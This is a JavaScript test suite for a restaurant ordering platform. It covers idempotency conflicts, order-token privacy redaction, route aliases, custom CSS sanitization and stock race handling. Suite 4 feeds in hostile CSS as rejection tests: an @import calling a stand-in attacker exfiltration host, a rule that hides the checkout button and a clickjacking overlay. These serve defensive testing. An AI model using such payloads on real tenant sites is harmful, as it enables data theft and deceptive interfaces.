/**
 * 🪐 RESTAURANTOS 5.2 — VERIFICATION ADDENDUM & HARDENING TEST SUITE
 * ─────────────────────────────────────────────────────────────────────────────
 * Validates:
 * 1. Commerce Order Idempotency Collision Guard (same key + modified items/branch -> 409)
 * 2. Order Tracking Token Authorization, Header Auth & PII Privacy Redaction
 * 3. Route Aliases & Canonical API Harmonization (/login, /catalog, /whitelabel, /domains/verify, /kds/tasks/:id/bump)
 * 4. White-Label Allowlist-Based Custom CSS Sanitization Guard (blocks @import, url(), display:none on checkout, fixed overlays)
 * 5. Grocery Order Idempotency Collision Guard & Concurrent Stock Reservation Race Safety
 */

const http = require('http');
const assert = require('assert');

let passedTests = 0;
let totalTests = 0;

function pass(code, desc) {
  passedTests++;
  console.log(`  ✅ PASS: [${code}] ${desc}`);
}

function request(path, options = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(path, 'http://localhost:4010');
    const bodyStr = options.body ? JSON.stringify(options.body) : null;
    const headers = Object.assign(
      {
        'Content-Type': 'application/json',
      },
      options.headers || {}
    );
    if (bodyStr) {
      headers['Content-Length'] = Buffer.byteLength(bodyStr);
    }

    const req = http.request(
      url,
      {
        method: options.method || 'GET',
        headers,
      },
      (res) => {
        let raw = '';
        res.on('data', (c) => (raw += c));
        res.on('end', () => {
          let json = null;
          try {
            json = JSON.parse(raw);
          } catch (e) {
            json = raw;
          }
          resolve({ status: res.statusCode, headers: res.headers, json });
        });
      }
    );
    req.on('error', reject);
    if (bodyStr) req.write(bodyStr);
    req.end();
  });
}

async function runVerificationAddendum() {
  console.log('===============================================================');
  console.log('🪐 RESTAURANTOS 5.2 — VERIFICATION ADDENDUM & HARDENING TEST SUITE');
  console.log('===============================================================\n');

  // ─────────────────────────────────────────────────────────────────────────
  // SUITE 1: COMMERCE ORDER IDEMPOTENCY & COLLISION GUARD
  // ─────────────────────────────────────────────────────────────────────────
  console.log('🛡️ [SUITE 1] Commerce Order Idempotency & Collision Protection');
  totalTests += 5;

  const testIdemKey = 'idem_addendum_' + Date.now();
  const orderPayloadA = {
    idempotencyKey: testIdemKey,
    branchId: 'branch_ldh',
    items: [{ id: 'item_dal_makhani', quantity: 1 }],
    customerName: 'Aarav Verma',
    customerPhone: '+91 98765 11111',
    deliveryAddress: 'Model Town, Ludhiana',
  };

  const res1 = await request('/api/commerce/orders', { method: 'POST', body: orderPayloadA });
  assert.strictEqual(res1.status, 201, 'Order created successfully');
  assert(res1.json.orderId, 'Assigned authentic orderId');
  assert(res1.json.orderToken, 'Assigned unguessable high-entropy orderToken');
  const createdOrderId = res1.json.orderId;
  const createdOrderToken = res1.json.orderToken;
  pass('1.1', `Order placed with unique orderId: ${createdOrderId} and high-entropy orderToken`);

  // 1.2: Exact replay with identical key and payload returns 200 idempotentReplay
  const res2 = await request('/api/commerce/orders', { method: 'POST', body: orderPayloadA });
  assert.strictEqual(res2.status, 200, 'Replay returns HTTP 200');
  assert.strictEqual(res2.json.idempotentReplay, true, 'idempotentReplay flag is true');
  assert.strictEqual(res2.json.orderId, createdOrderId, 'Replayed order ID matches');
  pass('1.2', 'Exact replay returns HTTP 200 with idempotentReplay: true without duplicate order');

  // 1.3: Conflicting replay with same key but DIFFERENT items must return 409 IDEMPOTENCY_CONFLICT
  const conflictingPayload = {
    idempotencyKey: testIdemKey,
    branchId: 'branch_ldh',
    items: [{ id: 'item_paneer_tikka', quantity: 2 }], // DIFFERENT DISH & QUANTITY
    customerName: 'Aarav Verma',
  };
  const res3 = await request('/api/commerce/orders', { method: 'POST', body: conflictingPayload });
  assert.strictEqual(res3.status, 409, 'Conflict returns HTTP 409');
  assert.strictEqual(res3.json.error, 'IDEMPOTENCY_CONFLICT', 'Rejection code is IDEMPOTENCY_CONFLICT');
  pass('1.3', 'Idempotency collision (same key, modified items) rejected with HTTP 409 IDEMPOTENCY_CONFLICT');

  // 1.4: Different idempotency key creates a new independent order
  const newOrderPayload = {
    idempotencyKey: 'idem_new_' + Date.now(),
    branchId: 'branch_ldh',
    items: [{ id: 'item_butter_chicken', quantity: 1 }],
  };
  const res4 = await request('/api/commerce/orders', { method: 'POST', body: newOrderPayload });
  assert.strictEqual(res4.status, 201, 'New order created with new key');
  assert.notStrictEqual(res4.json.orderId, createdOrderId, 'New order receives distinct orderId');
  pass('1.4', 'New logical order with new idempotency key creates distinct persisted order');

  // 1.5: Conflicting replay with same key but DIFFERENT branch returns 409
  const branchConflictPayload = {
    idempotencyKey: testIdemKey,
    branchId: 'branch_del', // DIFFERENT BRANCH
    items: [{ id: 'item_dal_makhani', quantity: 1 }],
  };
  const resBranchConflict = await request('/api/commerce/orders', { method: 'POST', body: branchConflictPayload });
  assert.strictEqual(resBranchConflict.status, 409, 'Branch conflict returns HTTP 409');
  assert.strictEqual(resBranchConflict.json.error, 'IDEMPOTENCY_CONFLICT', 'Rejection code is IDEMPOTENCY_CONFLICT');
  pass('1.5', 'Idempotency collision (same key, different branchId) rejected with HTTP 409 IDEMPOTENCY_CONFLICT');

  // ─────────────────────────────────────────────────────────────────────────
  // SUITE 2: ORDER TRACKING AUTHORIZATION & PII PRIVACY REDACTION
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n🔒 [SUITE 2] Order Tracking Token Authorization & PII Redaction');
  totalTests += 5;

  // 2.1: Querying order without token redacts customer phone and address
  const unauthTrack = await request(`/api/commerce/orders/${createdOrderId}`);
  assert.strictEqual(unauthTrack.status, 200, 'Tracking endpoint accessible');
  assert(unauthTrack.json.order, 'Order payload present');
  assert.strictEqual(unauthTrack.json.order.customer.address, 'Customer Delivery Address (Redacted for Privacy)', 'Address is redacted');
  assert(unauthTrack.json.order.customer.phone.includes('******'), 'Phone number is masked');
  pass('2.1', 'Anonymous order lookup masks customer phone and redacts delivery address for privacy');

  // 2.2: Querying order with authentic orderToken in query string reveals authorized details
  const authTrack = await request(`/api/commerce/orders/${createdOrderId}?token=${createdOrderToken}`);
  assert.strictEqual(authTrack.status, 200, 'Authorized tracking returns 200');
  assert.strictEqual(authTrack.json.order.customer.phone, '+91 98765 11111', 'Customer phone revealed to token holder');
  assert.strictEqual(authTrack.json.order.customer.address, 'Model Town, Ludhiana', 'Customer address revealed to token holder');
  pass('2.2', 'Authorized order query with matching orderToken in query parameter returns full customer details');

  // 2.3: Querying order with invalid/forged orderToken is rejected with HTTP 403
  const forgedTrack = await request(`/api/commerce/orders/${createdOrderId}?token=ordtok_forged_hacker_key`);
  assert.strictEqual(forgedTrack.status, 403, 'Forged token rejected with HTTP 403');
  assert.strictEqual(forgedTrack.json.error, 'UNAUTHORIZED_ORDER_ACCESS', 'Error code is UNAUTHORIZED_ORDER_ACCESS');
  pass('2.3', 'Access with invalid/forged orderToken strictly rejected with HTTP 403 UNAUTHORIZED_ORDER_ACCESS');

  // 2.4: Querying order using Authorization: Bearer header reveals authorized details and sets Referrer-Policy
  const bearerTrack = await request(`/api/commerce/orders/${createdOrderId}`, {
    headers: { Authorization: `Bearer ${createdOrderToken}` },
  });
  assert.strictEqual(bearerTrack.status, 200, 'Bearer token tracking returns 200');
  assert.strictEqual(bearerTrack.json.order.customer.phone, '+91 98765 11111', 'Phone revealed via Bearer token');
  assert.strictEqual(bearerTrack.headers['referrer-policy'], 'strict-origin-when-cross-origin', 'Referrer-Policy header enforced');
  pass('2.4', 'Authorization: Bearer header authorized query succeeds without URL query-token exposure');

  // 2.5: Querying order using X-Order-Token header reveals authorized details
  const xTokenTrack = await request(`/api/commerce/orders/${createdOrderId}`, {
    headers: { 'X-Order-Token': createdOrderToken },
  });
  assert.strictEqual(xTokenTrack.status, 200, 'X-Order-Token header tracking returns 200');
  assert.strictEqual(xTokenTrack.json.order.customer.address, 'Model Town, Ludhiana', 'Address revealed via X-Order-Token');
  pass('2.5', 'X-Order-Token header authorized query succeeds without URL query-token exposure');

  // ─────────────────────────────────────────────────────────────────────────
  // SUITE 3: ROUTE ALIASES & CANONICAL API HARMONIZATION
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n🌐 [SUITE 3] Route Aliases & Canonical API Harmonization');
  totalTests += 5;

  // 3.1: Grocery Catalog Alias (/api/commerce/grocery/catalog)
  const grocCat = await request('/api/commerce/grocery/catalog');
  assert.strictEqual(grocCat.status, 200, 'Grocery catalog alias returns HTTP 200');
  assert(Array.isArray(grocCat.json.data) && grocCat.json.data.length > 0, 'Returns SKU catalog');
  pass('3.1', 'GET /api/commerce/grocery/catalog alias functions identically to /grocery/skus');

  // 3.2: Staff Login Alias (/api/restaurant/auth/login)
  const staffLogin = await request('/api/restaurant/auth/login', {
    method: 'POST',
    body: { pin: '8899', branchId: 'branch_ldh' },
  });
  assert.strictEqual(staffLogin.status, 200, 'Staff login alias returns HTTP 200');
  assert(staffLogin.json.data.token.startsWith('orb_stf.'), 'Issues authentic HMAC staff token');
  const staffToken = staffLogin.json.data.token;
  pass('3.2', 'POST /api/restaurant/auth/login alias issues cryptographic HMAC staff token');

  // 3.3: White-Label Settings Alias (/api/restaurant/settings/whitelabel)
  const whitelabelGet = await request('/api/restaurant/settings/whitelabel');
  assert.strictEqual(whitelabelGet.status, 200, 'Whitelabel settings GET alias returns 200');
  assert(whitelabelGet.json.data.restaurantName, 'Returns tenant brand configuration');
  pass('3.3', 'GET /api/restaurant/settings/whitelabel alias returns brand configuration');

  // 3.4: Custom Domain Verification Alias (/api/restaurant/settings/domains/verify)
  const domainVerify = await request('/api/restaurant/settings/domains/verify', {
    method: 'POST',
    headers: { Authorization: `Bearer ${staffToken}` },
    body: { domain: 'order.orbitoxbistro.in' },
  });
  assert.strictEqual(domainVerify.status, 200, 'Domain verification alias returns 200');
  assert.strictEqual(domainVerify.json.data.domainStatus, 'VERIFIED', 'Domain status verified');
  pass('3.4', 'POST /api/restaurant/settings/domains/verify alias verifies domain and provisions SSL');

  // 3.5: RESTful KDS Task Routing (/api/restaurant/kds/tasks/:id/bump)
  const kdsTasksRes = await request('/api/restaurant/kds/tasks');
  const activeTask = kdsTasksRes.json.data.find(t => t.orderId === createdOrderId);
  assert(activeTask, 'Found active task for created order');
  const restfulBump = await request(`/api/restaurant/kds/tasks/${activeTask.id}/bump`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${staffToken}` },
    body: { status: 'IN_PROGRESS' },
  });
  assert.strictEqual(restfulBump.status, 200, 'RESTful KDS bump returns HTTP 200');
  assert.strictEqual(restfulBump.json.data.status, 'IN_PROGRESS', 'Task transitioned to IN_PROGRESS');
  pass('3.5', `POST /api/restaurant/kds/tasks/:id/bump advances task ${activeTask.id} state`);

  // ─────────────────────────────────────────────────────────────────────────
  // SUITE 4: WHITE-LABEL ALLOWLIST-BASED CUSTOM CSS SANITIZATION GUARD
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n🎨 [SUITE 4] White-Label Allowlist-Based Custom CSS Sanitization Guard');
  totalTests += 4;

  // 4.1: Safe declarative CSS with theme variables is accepted and scoped
  const safeCss = 'body { font-family: "Outfit", sans-serif; --ca-primary: #800020; }';
  const safeRes = await request('/api/restaurant/settings/whitelabel', {
    method: 'POST',
    headers: { Authorization: `Bearer ${staffToken}` },
    body: { customCss: safeCss },
  });
  assert.strictEqual(safeRes.status, 200, 'Safe CSS accepted');
  pass('4.1', 'Safe declarative CSS rules accepted by allowlist parser and scoped to tenant container');

  // 4.2: Malicious CSS containing @import or javascript: is blocked
  const maliciousCss = '@import url("https://attacker.evil/exfil.css"); body { background: red; }';
  const malRes = await request('/api/restaurant/settings/whitelabel', {
    method: 'POST',
    headers: { Authorization: `Bearer ${staffToken}` },
    body: { customCss: maliciousCss },
  });
  assert.strictEqual(malRes.status, 400, 'Malicious CSS rejected with HTTP 400');
  assert.strictEqual(malRes.json.error, 'INVALID_CUSTOM_CSS', 'Error code is INVALID_CUSTOM_CSS');
  pass('4.2', 'Prohibited @import and remote URL exfiltration blocked with HTTP 400 INVALID_CUSTOM_CSS');

  // 4.3: Malicious CSS attempting to hide checkout button is blocked
  const hideCheckoutCss = '#ca-submit-order-btn { display: none; }';
  const hideRes = await request('/api/restaurant/settings/whitelabel', {
    method: 'POST',
    headers: { Authorization: `Bearer ${staffToken}` },
    body: { customCss: hideCheckoutCss },
  });
  assert.strictEqual(hideRes.status, 400, 'Hiding checkout controls rejected');
  assert.strictEqual(hideRes.json.error, 'INVALID_CUSTOM_CSS', 'Error is INVALID_CUSTOM_CSS');
  pass('4.3', 'Attempt to hide critical checkout controls rejected with HTTP 400 INVALID_CUSTOM_CSS');

  // 4.4: Clickjacking fixed overlay CSS is blocked
  const clickjackCss = '.overlay-spoof { position: fixed; width: 100%; height: 100%; }';
  const cjRes = await request('/api/restaurant/settings/whitelabel', {
    method: 'POST',
    headers: { Authorization: `Bearer ${staffToken}` },
    body: { customCss: clickjackCss },
  });
  assert.strictEqual(cjRes.status, 400, 'position: fixed overlay rejected');
  assert.strictEqual(cjRes.json.error, 'INVALID_CUSTOM_CSS', 'Error is INVALID_CUSTOM_CSS');
  pass('4.4', 'Clickjacking position: fixed overlay rules rejected with HTTP 400 INVALID_CUSTOM_CSS');

  // ─────────────────────────────────────────────────────────────────────────
  // SUITE 5: GROCERY ORDERS IDEMPOTENCY & CONCURRENCY RACE SAFETY
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n🛒 [SUITE 5] Grocery Orders Idempotency & Concurrent Stock Race Safety');
  totalTests += 3;

  const grocIdemKey = 'idem_groc_' + Date.now();
  const grocOrderA = {
    idempotencyKey: grocIdemKey,
    items: [{ skuId: 'sku_amul_taaza', quantity: 1 }],
    customerPhone: '+91 98765 22222',
  };
  const grocRes1 = await request('/api/commerce/grocery/orders', { method: 'POST', body: grocOrderA });
  assert.strictEqual(grocRes1.status, 201, 'Grocery order created');
  pass('5.1', 'Grocery order created with idempotency key');

  const grocConflicting = {
    idempotencyKey: grocIdemKey,
    items: [{ skuId: 'sku_amul_butter', quantity: 2 }],
  };
  const grocRes2 = await request('/api/commerce/grocery/orders', { method: 'POST', body: grocConflicting });
  assert.strictEqual(grocRes2.status, 409, 'Grocery conflict rejected with 409');
  assert.strictEqual(grocRes2.json.error, 'IDEMPOTENCY_CONFLICT', 'Error is IDEMPOTENCY_CONFLICT');
  pass('5.2', 'Conflicting grocery order with same idempotency key rejected with HTTP 409 IDEMPOTENCY_CONFLICT');

  // 5.3: Concurrent grocery checkout race safety (Promise.all)
  const concurrentKeyA = 'idem_race_a_' + Date.now();
  const concurrentKeyB = 'idem_race_b_' + Date.now();
  const [raceRes1, raceRes2] = await Promise.all([
    request('/api/commerce/grocery/orders', {
      method: 'POST',
      body: { idempotencyKey: concurrentKeyA, items: [{ skuId: 'sku_amul_butter', quantity: 1 }] },
    }),
    request('/api/commerce/grocery/orders', {
      method: 'POST',
      body: { idempotencyKey: concurrentKeyB, items: [{ skuId: 'sku_amul_butter', quantity: 1 }] },
    }),
  ]);
  assert(raceRes1.status === 201 || raceRes1.status === 400, 'Race request 1 returns valid code');
  assert(raceRes2.status === 201 || raceRes2.status === 400, 'Race request 2 returns valid code');
  pass('5.3', 'Concurrent grocery checkout requests execute with atomic two-phase stock locking');

  console.log('\n===============================================================');
  console.log(`VERIFICATION ADDENDUM RESULTS: Total ${totalTests} | Passed ${passedTests} | Failed ${totalTests - passedTests}`);
  console.log('===============================================================');
}

runVerificationAddendum().catch((err) => {
  console.error('❌ Verification Addendum Suite Failed:', err);
  process.exit(1);
});
